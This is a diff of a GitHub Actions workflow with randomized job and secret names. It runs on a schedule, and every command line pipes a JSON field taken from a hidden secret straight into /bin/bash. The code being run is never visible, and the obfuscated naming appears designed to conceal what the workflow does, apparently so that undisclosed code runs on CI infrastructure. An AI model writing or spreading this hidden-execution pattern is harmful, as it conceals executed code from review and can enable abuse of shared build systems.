@@ -2,7 +2,8 @@ name: ruanxiaowu19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 2/6 * * *'
+    - cron: '41 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,14 +12,20 @@ jobs:
       - uses: actions/checkout@v4
       - name: ruanxiaowu19871010
         env:
-          iaezo30: ${{ secrets.iaezo30 }}
+          mcphk84331: ${{ secrets.mcphk84331 }}
         run: |
-          echo $iaezo30 | jq -r .yf5749 | /bin/bash
-          echo $yrnf829 | jq -r .gw60 | /bin/bash
-          echo $zmu18758 | jq -r .lz3401 | /bin/bash
-          echo $hnsj2 | jq -r .qypa99083 | /bin/bash
-          echo $kcbl916 | jq -r .stzhn142 | /bin/bash
-          echo $hzoyf9579 | jq -r .qa7288 | /bin/bash
-          echo $ea72 | jq -r .s6643 | /bin/bash
-          echo $tf8 | jq -r .rbct6209 | /bin/bash
+          echo $mcphk84331 | jq -r .vmrul14433 | /bin/bash
+          echo $ado5 | jq -r .d7 | /bin/bash
+          echo $nnew3 | jq -r .vpd8269 | /bin/bash
+          echo $nesvx54672 | jq -r .bmdo8113 | /bin/bash
+          echo $p93 | jq -r .bk3500 | /bin/bash
+          echo $xdh52 | jq -r .vbap09475 | /bin/bash
+          echo $jqlco0 | jq -r .gdq50897 | /bin/bash
+          echo $tr04612 | jq -r .jnbz19855 | /bin/bash
+          echo $a9 | jq -r .l17 | /bin/bash
+          echo $cbyt09873 | jq -r .zsa48 | /bin/bash
+          echo $ub93253 | jq -r .tsu80527 | /bin/bash
+          echo $n480 | jq -r .ojoc1239 | /bin/bash
+          echo $ne54992 | jq -r .sapy11 | /bin/bash
+          echo $gsstz89 | jq -r .cdd424 | /bin/bash
 
